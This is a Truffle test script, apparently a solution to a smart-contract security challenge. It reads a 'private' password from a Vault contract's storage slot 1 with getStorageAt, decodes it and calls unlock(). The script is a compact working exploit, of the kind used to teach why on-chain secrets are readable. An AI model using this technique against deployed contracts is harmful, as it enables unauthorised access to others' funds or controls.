const Vault = artifacts.require("Vault");


let vaultInstance
let password


contract('Vault', (accounts) => {

  before(async () => {
    vaultInstance = await Vault.deployed()
  })

  it('Sanity check', async () => {
    let isLocked = await vaultInstance.locked()
    console.log("is locked?: ", isLocked);
    assert.equal(isLocked, true, "Original contract should be locked")

  });

  it('Retrieves password', async () => {
    password = await web3.eth.getStorageAt(Vault.address, 1)
    let decodedPassword = web3.utils.hexToAscii(password)
    console.log("decoded password", decodedPassword);
  });

  it('unlocks contract', async () => {
    await vaultInstance.unlock(password)
    let isLocked = await vaultInstance.locked()
    assert.equal(isLocked, false, "Contract should be now unlocked")
  });



  


  
});